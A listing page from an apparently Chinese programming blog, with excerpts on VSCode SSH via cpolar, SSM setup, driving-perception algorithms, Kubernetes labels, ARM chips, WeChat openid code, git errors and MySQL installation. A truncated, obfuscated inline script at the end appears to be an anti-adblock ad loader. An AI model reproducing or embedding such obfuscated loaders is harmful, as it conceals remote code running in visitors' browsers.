3. 局域网测试连接远程服务器 以ssh连接ubuntu为例，打开vscode后，先尝试使用局域网地址ssh远程ubuntu
输入命令到对话框中，并回车
ssh username@ip 选择一个配置文件
输入完成在右侧会显示出来刚刚添加的ssh 连接,点击 --&gt;图标 连接,出现输入密码,输入密码即可
出现绿色标志表示连接成功
4. 公网远程连接 目前我们只能在局域网内进行远程，具有一定的局限性。不过我们通过内网穿透来实现在公网环境下的远程连接。这里我们借助工具cpolar内网穿透来实现，无需公网IP，也不用设置路由器，操作简单。
cpolar官网：https://www.cpolar.com/
4.1 ubuntu安装cpolar内网穿透 本次教程我们使用的是ubuntu 图形化系统，我们需要先在ubuntu上安装配置[cpolar内网穿透](cpolar - 安全的内网穿透工具)，支持一键自动安装脚本。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3320447a8aa3275d08ac9862e344f51d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e01b187bcb95f3fa1eab17fc60e20d2/" rel="bookmark">
			IDEA搭建SSM框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
项目目录
一、新建项目 1.新建maven项目
2.点击Next，填写GroupId、ArtifactId
3.点击Next，配置路径
4.继续next，选择项目保存的位置
5.构建项目目录
二、配置文件
1.pom.xml配置
2.jdbc.properties配置
3.mybatis-config.xml配置
4.applicationContext.xml配置
5. dispatcherServlet.xml配置
6.web.xml配置
三.配置log4j日志
1.pom.xml配置
2.log4j.properties配置
四.mybatis逆向工程
1.pom.xml配置
2.generatorConfig.xml配置
3.找到 Maven ----&gt; …Webapp -----&gt; Plugins -----&gt; mybatis-generator
五、开发
1.数据库
2.UserService.java
3.UserController.java
六.配置Tomcat
1.添加tomcat
2.配置Tomcat服务器页签
3.部署页签
4.Apply OK 之后，Tomcat 配置成功；
七.测试
八、可能出现的问题
1.tomcat控制台乱码
2.启动 tomcat 出错 / 访问地址404 / 配置应用程序监听器[org.springframework.web.context.ContextLoaderListener]错误
3.Mybatis异常“Cannot enable lazy loading because CGLIB is not available. Add CGLIB to your classpath.”
4.mysql 连接错误 No suitable driver
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e01b187bcb95f3fa1eab17fc60e20d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/816398bbaaad1078d12750575ad5b322/" rel="bookmark">
			自动驾驶视觉感知算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 环境感知是自动驾驶的第一环，是车辆和环境交互的纽带。一个自动驾驶系统整体表现的好坏，很大程度上都取决于感知系统的好坏。目前，环境感知技术有两大主流技术路线：
①以视觉为主导的多传感器融合方案，典型代表是特斯拉；
②以激光雷达为主导，其他传感器为辅助的技术方案，典型代表如谷歌、百度等。
我们将围绕着环境感知中关键的视觉感知算法进行介绍，其任务涵盖范围及其所属技术领域如下图所示。我们分为两节分别梳理了2D和3D视觉感知算法的脉络和方向。
本节我们先从广泛应用于自动驾驶的几个任务出发介绍2D视觉感知算法，包括基于图像或视频的2D目标检测和跟踪，以及2D场景的语义分割。近些年，深度学习渗透到视觉感知的各个领域，取得不错的成绩，因此，我们梳理了一些经典的深度学习算法。
目标检测 1.1 两阶段检测
两阶段指的是实现检测的方式有先后两个过程，一是提取物体区域；二是对区域进行CNN分类识别；因此，“两阶段”又称基于候选区域（Region proposal）的目标检测。代表性算法有R-CNN系列（R-CNN、Fast R-CNN、Faster R-CNN）等。
Faster R-CNN是第一个端到端的检测网络。第一阶段利用一个区域候选网络（RPN）在特征图的基础上生成候选框，使用ROIPooling对齐候选特征的大小；第二阶段用全连接层做细化分类和回归。这里提出了Anchor的思想，减少运算难度，提高速度。特征图的每个位置会生成不同大小、长宽比的Anchor，用来作为物体框回归的参考。Anchor的引入使得回归任务只用处理相对较小的变化，因此网络的学习会更加容易。下图是Faster R-CNN的网络结构图。
CascadeRCNN第一阶段和Faster R-CNN完全一样，第二阶段使用多个RoiHead层进行级联。后续的一些工作多是围绕着上述网络的一些改进或者前人工作的杂烩，罕有突破性提升。
1.2 单阶段检测
相较于两阶段算法，单阶段算法只需一次提取特征即可实现目标检测，其速度算法更快，一般精度稍微低一些。这类算法的开山之作是YOLO，随后SSD、Retinanet依次对其进行了改进，提出YOLO的团队将这些有助于提升性能的trick融入到YOLO算法中，后续又提出了4个改进版本YOLOv2~YOLOv5。尽管预测准确率不如双阶段目标检测算法，由于较快的运行速度，YOLO成为了工业界的主流。下图是YOLOv3的网络结构图。
1.3 Anchor-free检测（无Anchor检测）
这类方法一般是将物体表示为一些关键点，CNN被用来回归这些关键点的位置。关键点可以是物体框的中心点（CenterNet）、角点（CornerNet）或者代表点（RepPoints）。CenterNet将目标检测问题转换成中心点预测问题，即用目标的中心点来表示该目标，并通过预测目标中心点的偏移量与宽高来获取目标的矩形框。Heatmap表示分类信息，每一个类别将会产生一个单独的Heatmap图。对于每张Heatmap图而言，当某个坐标处包含目标的中心点时，则会在该目标处产生一个关键点，我们利用高斯圆来表示整个关键点，下图展示了具体的细节。
RepPoints提出将物体表示为一个代表性点集，并且通过可变形卷积来适应物体的形状变化。点集最后被转换为物体框，用于计算与手工标注的差异。
1.4 Transformer检测
无论是单阶段还是两阶段目标检测，无论采用Anchor与否，都没有很好地利用到注意力机制。针对这种情况，Relation Net和DETR利用Transformer将注意力机制引入到目标检测领域。Relation Net利用Transformer对不同目标之间的关系建模，在特征之中融入了关系信息，实现了特征增强。DETR则是基于Transformer提出了全新的目标检测架构，开启了目标检测的新时代，下图是DETR的算法流程，先采用CNN提取图像特征，然后用Transformer对全局的空间关系进行建模，最后得到的输出通过二分图匹配算法与手工标注进行匹配。
下表中的准确度采用MSCOCO数据库上的mAP作为指标，而速度则采用FPS来衡量，对比了上述部分算法，由于网络的结构设计中存在很多不同的选择（比如不同的输入大小，不同的Backbone网络等），各个算法的实现硬件平台也不同，因此准确率和速度并不完全可比，这里只列出来一个粗略的结果供大家参考。
​
目标跟踪 在自动驾驶应用中，输入的是视频数据，需要关注的目标有很多，比如车辆，行人，自行车等等。因此，这是一个典型的多物体跟踪任务（MOT）。对于MOT任务来说，目前最流行的框架是Tracking-by-Detection，其流程如下：
①由目标检测器在单帧图像上得到目标框输出；
②提取每个检测目标的特征，通常包括视觉特征和运动特征；
③根据特征计算来自相邻帧的目标检测之间的相似度，以判断其来自同一个目标的概率；
④将相邻帧的目标检测进行匹配，给来自同一个目标的物体分配相同的ID。
深度学习在以上这四个步骤中都有应用，但是以前两个步骤为主。在步骤1中，深度学习的应用主要在于提供高质量的目标检测器，因此一般都选择准确率较高的方法。SORT是基于Faster R-CNN的目标检测方法，并利用卡尔曼滤波算法+匈牙利算法，极大提高了多目标跟踪的速度，同时达到了SOTA的准确率，也是在实际应用中使用较为广泛的一个算法。在步骤2中，深度学习的应用主要在于利用CNN提取物体的视觉特征。DeepSORT最大的特点是加入外观信息，借用了ReID模块来提取深度学习特征，减少了ID switch的次数。整体流程图如下：
此外，还有一种框架Simultaneous Detection and Tracking。如代表性的CenterTrack，它起源于之前介绍过的单阶段无Anchor的检测算法CenterNet。与CenterNet相比，CenterTrack增加了前一帧的RGB图像和物体中心Heatmap作为额外输入，增加了一个Offset分支用来进行前后帧的Association。与多个阶段的Tracking-by-Detection相比，CenterTrack将检测和匹配阶段用一个网络来实现，提高了MOT的速度。
语义分割 在自动驾驶的车道线检测和可行驶区域检测任务中均用到了语义分割。代表性的算法有FCN、U-Net、DeepLab系列等。DeepLab使用扩张卷积和ASPP（Atrous Spatial Pyramid Pooling）结构，对输入图像进行多尺度处理。最后采用传统语义分割方法中常用的条件随机场（CRF）来优化分割结果。下图是DeepLab v3+的网络结构。
近些年的STDC算法采用了类似FCN算法的结构，去掉了U-Net算法复杂的decoder结构。但同时在网络下采样的过程中，利用ARM模块不断地去融合来自不同层特征图的信息，因此也避免了FCN算法只考虑单个像素关系的缺点。可以说，STDC算法很好的做到了速度与精度的平衡，其可以满足自动驾驶系统实时性的要求。算法流程如下图所示。
单目3D感知 基于单摄像头图像来感知3D环境是一个不适定问题，但是可以通过几何假设（比如像素位于地面）、先验知识或者一些额外信息（比如深度估计）来辅助解决。本次将从实现自动驾驶的两个基本任务（3D目标检测和深度估计）出发进行相关算法介绍。
1.1 3D目标检测
表示转换（伪激光雷达）：视觉传感器对周围其他车辆等的检测通常会遇到遮挡、无法度量距离等问题，可以将透视图转换成鸟瞰图表示。这里介绍两种变换方法。一是逆透视图映射（IPM），它假定所有像素都在地面上，并且相机外参准确，此时可以采用Homography变换将图像转换到BEV，后续再采用基于YOLO网络的方法检测目标的接地框。二是正交特征变换（OFT），利用ResNet-18提取透视图图像特征。然后，通过在投影的体素区域上累积基于图像的特征来生成基于体素的特征。然后将体素特征沿垂直方向折叠以产生正交的地平面特征。最后，用另一个类似于ResNet的自上而下的网络进行3D目标检测。这些方法只适应于车辆、行人这类贴地的目标。对于交通标志牌、红绿灯这类非贴地目标来说，可以通过深度估计来生成伪点云，进而进行3D检测。Pseudo-LiDAR先利用深度估计的结果生成点云，再直接应用基于激光雷达的3D目标检测器生成3D目标框，其算法流程如下图所示，
关键点和3D模型：待检测目标如车辆、行人等其大小和形状相对固定且已知，这些可以被用作估计目标3D信息的先验知识。DeepMANTA是这个方向的开创性工作之一。首先，采用一些目标检测算法比如Faster RNN来得到2D目标框，同时也检测目标的关键点。然后，将这些2D目标框和关键点与数据库中的多种3D车辆CAD模型分别进行匹配，选择相似度最高的模型作为3D目标检测的输出。MonoGRNet则提出将单目3D目标检测分成四个步骤：2D目标检测、实例级深度估计、投影3D中心估计和局部角点回归，算法流程如下图所示。这类方法都假设目标有相对固定的形状模型，对于车辆来说一般是满足的，对于行人来说就相对困难一些。
2D/3D几何约束：对3D中心和粗略实例深度的投影进行回归，并使用这二者估算粗略的3D位置。开创性的工作是Deep3DBox，首先用2D目标框内的图像特征来估计目标大小和朝向。然后，通过一个2D/3D的几何约束来求解中心点3D位置。这个约束就是3D目标框在图像上的投影是被2D目标框紧密包围的，即2D目标框的每条边上都至少能找到一个3D目标框的角点。通过之前已经预测的大小和朝向，再配合上相机的标定参数，可以求解出中心点的3D位置。2D和3D目标框之间的几何约束如下图所示。Shift R-CNN在Deep3DBox的基础上将之前得到的2D目标框、3D目标框以及相机参数合并起来作为输入，采用全连接网络预测更为精确的3D位置。
直接生成3DBox：这类方法从稠密的3D目标候选框出发，通过2D图像上的特征对所有的候选框进行评分，评分高的候选框即是最终的输出。有些类似目标检测中传统的滑动窗口方法。代表性的Mono3D算法首先基于目标先验位置（z坐标位于地面）和大小来生成稠密的3D候选框。这些3D候选框投影到图像坐标后，通过综合2D图像上的特征对其进行评分，再通过CNN再进行二轮评分得到最终的3D目标框。M3D-RPN是一种基于Anchor的方法，定义了2D和3D的Anchor。2D Anchor通过图像上稠密采样得到，3D Anchor是通过训练集数据的先验知识（如目标实际大小的均值）确定的。M3D-RPN还同时采用了标准卷积和Depth-Aware卷积。前者具有空间不变性，后者将图像的行（Y坐标）分成多个组，每个组对应不同的场景深度，采用不同的卷积核来处理。上述这些稠密采样方法计算量非常大。SS3D则采用更为高效的单阶段检测，包括用于输出图像中每个相关目标的冗余表示以及相应的不确定性估计的CNN，以及3D边框优化器。FCOS3D也是一个单阶段的检测方法，回归目标额外增加了一个由3D目标框中心投影到2D图像得到的2.5D中心（X,Y,Depth）。
1.2 深度估计
不管是上述的3D目标检测还是自动驾驶感知的另一项重要任务——语义分割，从2D扩展到3D，都或多或少得应用到了稀疏或稠密的深度信息。单目深度估计的重要性不言而喻，其输入是一张图像，输出是相同大小的一张由每个像素对应的场景深度值组成的图像。输入也可以是视频序列，利用相机或者物体运动带来的额外信息来提高深度估计的准确度。相比于监督学习，单目深度估计的无监督方法无需构建极具挑战性的真值数据集，实现难度更小。单目深度估计的无监督方法可分为基于单目视频序列和基于同步立体图像对两种。前者是建立在运动相机和静止场景的假设之上的。在后者的方法中，Garg等人首次尝试使用同一时刻立体校正后的双目图像对进行图像重建，左右视图的位姿关系通过双目标定得到，获得了较为理想的效果。在此基础上，Godard等人用左右一致性约束进一步地提升了精度，但是，在逐层下采样提取高级特征来增大感受野的同时，特征分辨率也在不断下降，粒度不断丢失，影响了深度的细节处理效果和边界清晰度。为缓解这一问题，Godard等人引入了全分辨率多尺度的损失，有效减少了低纹理区域的黑洞和纹理复制带来的伪影。但是，这对精度的提升效果仍是有限的。最近，一些基于Transformer的模型层出不穷，旨于获得全阶段的全局感受野，这也非常适用于密集的深度估计任务。有监督的DPT中就提出采用Transformer和多尺度结构来同时保证预测的局部精确性和全局一致性，下图是网络结构图。
双目3D感知 双目视觉可以解决透视变换带来的歧义性，因此从理论上来说可以提高3D感知的准确度。但是双目系统在硬件和软件上要求都比较高。硬件上来说需要两个精确配准的摄像头，而且需要保证在车辆运行过程中始终保持配准的正确性。软件上来说算法需要同时处理来自两个摄像头的数据，计算复杂度较高，算法的实时性难以保证。与单目相比，双目的工作相对较少。接下来也同样从3D目标检测和深度估计两方面进行简单介绍。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/816398bbaaad1078d12750575ad5b322/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e49d192331079cef3e1a298dc32d33a9/" rel="bookmark">
			九. Kubernetes 标签与选择器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一. 标签yaml中对资源添加标签标签的分类 二. 标签选择器 一. 标签 标签:是附加在Kubernetes对象上的一组键值对,意图是对指定资源进行有意义的标识以前面封装k8sService为例,针对部署的指定标签,对一组部署封装为一个service统一向外暴露服务地址,通过标签去选择 kubectl expose deploy my-nginx2 --port=8888 --target-port=8080 --type=NodePort 标签创建规则: 标签的key可以有两个部分：可选的前缀和标签名，通过"/"分割标签名是必填的,不能多于63个字符,必须由字母、数字开始和结尾,可以包含字母,数字,减号,下划线,小数点标签前缀部分是可选的,如果指定，必须是一个DNS的子域名，例如：k8s.eip.work, 不能多于253个字符,使用"/"分隔标签value必填, 不能多于63个字符,可以为空字符串,否则必须由字母,数字开始和结尾,可以包含字母,数字,减号,下划线,小数点 创建标签命令 #针对资源添加标签 kubectl label 资源类型 标签名=标签值 #针对资源下的指定资源添加标签 kubectl label 资源类型 资源名 标签名=标签值 获取标签 kubectl get labels //查询资源信息时显示标签 kubectl get pod --show-labels 删除标签 kubectl label 资源类型 资源名 标签名- yaml中对资源添加标签 查询已经存在的资源的标签yaml kubectl get 资源类型 资源名 -o yaml //以pod为例 kubectl get pod pod名称 -o yaml yaml中metadata.labels下就是标签相关信息,模范这个给指定资源添加标签
apiVersion: v1 kind: Pod metadata: name: label-demo labels:#设置标签(可以有多个) environment: production app: nginx 标签的分类 标签是用来标识和选择资源的元数据,为了方便使用可以对标签进行分类,例如 //1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e49d192331079cef3e1a298dc32d33a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d433096f42471d916b05f0e6038f880f/" rel="bookmark">
			既“躺不平”又“卷不赢”，漩涡之中的ARM该如何自救？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		国产ARM红海竞争，趋同下的内卷已不可避免。
在日益白热化的市场情况中，面对“长板不够长，短板太明显”的ARM生态，以及X86和全面自研两条路线国产CPU的围猎，昔日芯片霸主ARM正陷入尴尬之境：既躺不平，又卷不赢。
如何“自救”？成为摆在ARM和国产ARM厂商面前的难题。
趋同下“内卷”漩涡，卷不赢
纵观整个芯片市场，ARM绝对是一个特殊的存在。
近年来，国产ARM厂商的发展可以用“狂飙”一词来形容：一方面是凭借低功耗优势搭上了智能手机的发展快车道，另一方面是低门槛属性吸引了国产厂商的蜂拥入场。
然而国产ARM市场的竞争日益白热化。由于大部分厂商的产品方案都是基于ARM核来展开的，这也直接让国产ARM厂商不可阻挡的被迫跌入同质化的巨坑。以MCU领域为例，应用ARM核的厂商达到90%以上。然而超高的市场占比带来的却是毫无特色的“千篇一律”。相关行业人士在对MCU赛道中的16家汽车控制类芯片厂商进行调研时，不少调研对象给予了“平平无奇”的“差评”。
上帝所有的馈赠都暗中标好了价格。早前，由于ARM的低门槛属性，直接吸引了众多国产ARM厂商的加入，并得到快速发展，然而其授权机制，在直接决定市场化进程、技术发展路线的同时，也直接限定了国产ARM厂商发展的天花板。尤其是2022年ARM先进芯片设计IP停售，大部分国内厂商只能停留在ARMv8.2版本。
在此大背景下，“低门槛带来的有限的空间+越来越多的国产ARM玩家涌入”，尤其是在产品趋同且增量市场疲软的大环境下，低维度竞争魔咒几乎成为“宿命”。这也直接将国产ARM厂商们被迫推入趋同下的内卷“漩涡”。
而眼下，ARM正加快推动赴美上市计划，可预料的是，上市后ARM公司与美国的绑定将进一步加深，这也让未来授权“解禁”的希望变得更加遥远。
对于国产ARM厂商而言，想要卷赢的概率，似乎渺茫如梦。
ARM红海竞争，躺不平
ARM的危机远非内卷这么简单。
除深陷同质化内卷“漩涡”，自身难以“更进一步”，进而遭遇“灭顶之灾”（ARM最新版本不授权决定发展上限）外，国产ARM厂商们还遭遇着来自周围各类强势“友商”的致命“狙击”。
比如同样是基于精简指令集原理的RISC-V，在给ARM带来巨大冲击的同时，如蚕吃桑叶一样，ARM的市场份额正被一点一点地吃掉。
近几年，凭借开放性、灵活性和可定制性等多重优势，RISC-V架构快速走红，并成为整个芯片产业的新宠儿。相较于传统的ARM架构，RISC-V的开源特性，成为其深受广大企业青睐的主要原因。尤其是对于很多小公司和初创企业而言，可以更容易获得芯片设计授权，从ARM昂贵且充满不确定性的授权费中真正解放出来。
目前RISC-V 在中国已经有了不少的成功案例，并且产品性能优势较为突出。例如今年5月举办的2023年中关村论坛上，中国科学院先导项目成果第二代“香山”开源高性能RISC-V处理器核近日发布，其性能超过Arm公司发布的Cortex-A76内核。
屋漏偏逢连夜雨，船迟又遇顶头风。在异军突起的RISC-V架构，逐步蚕食ARM市场的同时，龙芯和x86等架构也在疯狂“堵截”ARM，不仅让ARM“躺不平”，甚至还使其“睡不着”。
龙芯作为中国成立最早的处理器芯片制造企业，其在中国芯片国产化进程中有着举足轻重的地位，随着基于MIPS自研LoongArch指令集的成果不断推出，其“学习再创新"的发展路径，目前也已经被证明是可行的，这也给更多国产ARM厂商的客户有了更多选择。
而X86架构作为计算机领域中最为广泛应用的指令集架构之一，被用于个人电脑、服务器和其他类型的计算机系统，目前仍占据市场超90%的份额，也是ARM难以逾越的大山。
尾声：“ARM们”的抢滩未来的重点
内忧外困的国产ARM厂商们，该如何自救？
2020年，信创产业“元年”开启，信创行业开始全面爆发。紧接着的2021年，信创产业逐步走向应用落地阶段，适配生态、产品迭代等关键词凸显了信创产业在“2+8”行业应用中的良好态势。
在信创应用落地中，我们发现主要集中在两个方面，一是深耕党政信创解决方案；二是关系国计民生的重要行业，各CPU厂商纷纷通过产品服务升级和渠道，不断抢占信创风口。
在此大背景下，国产ARM厂商们攻城略地、野蛮生长，可谓风光无限。然而“成也萧何 败也萧何”的是，如今中国信创产业依旧如火如荼，但ARM授权问题无解、产品同质化的问题日益暴露，却使厂商们如势不能穿鲁缟的“强弩之末”。
如何确保产品可持续迭代，如何确保应用为先，时刻保持危机感，永远重视创新，既是立足信创市场不败之地的根本，也是包括除了国产ARM厂商外，所有人都需要共同思考的课题。
*本文图片均来源于网络
部分图片来自网络，且未核实版权归属，不作为商业用途，如有侵犯，请作者与我们联系。
•AI产业新媒体;
•澎湃新闻科技榜单月度top5;
•文章长期“霸占”钛媒体热门文章排行榜TOP10;
•著有《人工智能 十万个为什么》
•【重点关注领域】智能家电（含白电、黑电、智能手机、无人机等AIoT设备）、智能驾驶、AI+医疗、机器人、物联网、AI+金融、AI+教育、AR/VR、云计算、开发者以及背后的芯片、算法等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a7e93e4bf21af016c94e27e8ad6a519/" rel="bookmark">
			通过小程序获取微信用户的公众号openid
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@Value("${wx.appId}") private String appId; @Value("${wx.secret}") private String secret; @Resource private HPatientMapper hPatientMapper; @Resource private HSharePersonMapper sharePersonMapper; @RabbitListener(queues = "TTL_DOCTOR") @RabbitHandler public void infoConsumption(String message) { log.info("开始消费"); String urlToke = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=" + appId + "&amp;secret=" + secret;//微信公众号的 try { Response response = OkHttpUtil.get(urlToke); if (response.isSuccessful()) { String string = response.body().string(); Map&lt;String, String&gt; map = JSONObject.parseObject(string, Map.class); String access_token = map.get("access_token"); String next_openid = ""; String urlOpenid = "https://api.weixin.qq.com/cgi-bin/user/get?access_token=" + access_token + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a7e93e4bf21af016c94e27e8ad6a519/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9f78673d23cb691fbbfa3ccc4df67c9/" rel="bookmark">
			Python学习篇——类学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python入门 类class 基础篇
Python入门 类class提高篇 - 知乎
Python入门 class类的继承 - 知乎
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/191913073e68ddfbde225619ce1b649a/" rel="bookmark">
			gitlab分支代码合并-实测有效
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实测有效
https://www.cnblogs.com/97Coding/p/16969317.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2a7635af4f16b68ca61a0943671f8e6/" rel="bookmark">
			【记录拉取远程仓库时一些报错】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录拉取远程仓库时一些报错 注意：前提是git中的SSH密钥的配置已经成功
1、could not read Username for ‘https://git.xxx.com’: terminal prompt 报错：
fatal: Cannot prompt because user interactivity has been disabled. could not read Username for ‘https://git.xxx.com’: terminal prompt 解决：
go env -w GOPRIVATE=“git.xxx.com”
2、fatal: Cannot prompt because user interactivity has been disabled 在本地代码拉取私有仓库依赖时报错
报错：
fatal: Cannot prompt because user interactivity has been disabled. fatal: could not read Username for 'https://github.com': terminal prompts disabled Confirm the import path was entered correctly.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2a7635af4f16b68ca61a0943671f8e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2134fc97404a80236e71b083aecee98b/" rel="bookmark">
			MySQL安装配置与连接Navicat
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文详细记录win11系统MySQL安装配置与Navicat连接过程，每个知识点都解释了，不止安好了，你还学懂了！你不知道选择哪个版本，不知道参数啥意思，不知道哪种安装方式好？这里都有答案！！！
原文地址：https://blog.jiumoz.com/archives/mysql-an-zhuang-pei-zhi-yu-navicat-lian-jie
MySQL的两种安装方式 安装之前看看MySQL的安装方式啊，因为我看网上的安装方式很多，不同的方式，安装包也不同，就怕像我这样一知半解的人读啊，看着看着就迷糊了，看看区别；
主要是两种方式，一种是需要安装的，一种是只需要解压的；
具体下载界面区别如下图，左边的是直接解压的，右边的是要使用图形界面安装的；
MySQL提供ZIP Archive和MSI Installer两种安装方式。它们之间的区别如下：
ZIP Archive：适用于需要将MySQL部署到多个服务器或者本地开发环境中，可以通过解压缩文件在不同的目录中安装MySQL，并且它的安装过程相对简单、灵活。
MSI Installer：适用于需要在Windows系统上快速安装MySQL，拥有更完整的功能和可视化的安装过程，安装时会自动逐一完成MySQL所需组件的安装与配置。同时，它提供了一些额外的工具，如MySQL Workbench等，方便用户进行数据库开发和管理。
如果只是安装MySQL服务器，那么ZIP Archive是一个好的选择。如果需要MySQL图形管理工具或其他额外的功能，则应选择MSI Installer。
MySQL Community Server和MySQL Installer都是MySQL数据库的安装程序。
MySQL Community Server是MySQL的标准版，是MySQL官方提供的一个开源免费的关系型数据库管理系统，包含了完整的MySQL数据库系统，可以满足基本的数据库需求。
MySQL Installer是MySQL官方提供的安装程序，可以帮助用户快速安装和配置MySQL数据库系统以及其他相关的工具、库和插件。该程序支持Windows、Linux和MacOS等操作系统平台，同时也包含了MySQL Workbench等其他MySQL工具。
因此，如果只是需要MySQL数据库系统，那么可以选择MySQL Community Server进行安装；如果您还需要其他MySQL工具等，则可以选择MySQL Installer进行安装，MySQL Installer还提供了一些附加功能，如备份、恢复数据和MySQL Shell等模块。
个人是使用MySQL服务就够了，其他的都用诸如Navicat的管理工具，所以安装的是直接解压缩的版本，如果你不需要这个版本可以移步其他文章啦~
下载安装包 MySQL官网下载地址：https://dev.mysql.com/downloads/mysql/
这里你会发现网上的教程给的地址不太一致，很多教程给的地址是：https://downloads.mysql.com/archives/installer/
进入https://dev.mysql.com/downloads/mysql/你看到的页面如下，点击Archives就切换到另一个地址了。
其实也就是版本不同，主要是小白的话可能会迷惑~
那么这两个版本有什么区别呢？
General Availability (GA) Releases 是建议在生产系统中使用的版本，通常每18到24个月发布一个新的 GA Release 版本，可从 MySQL Developer Zone 下载。
Archives 是所有 MySQL 版本的历史记录，包括 GA Releases、DMRs、RCs 和其他版本，它们适合于测试、升级以及其他目的。可以从 Archives 中选择以前的版本进行下载。
怎么选？
如果你需要一个稳定的版本并希望将其用于生产系统，请下载 GA Releases。如果您需要测试或升级 MySQL，则可以从 Archives 中选择。
如果你还是不知道怎么选，而且只是用MySQL来学习和普通场景的开发，跟着我的教程走就行~
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2134fc97404a80236e71b083aecee98b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/96/">«</a>
	<span class="pagination__item pagination__item--current">97/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/98/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return 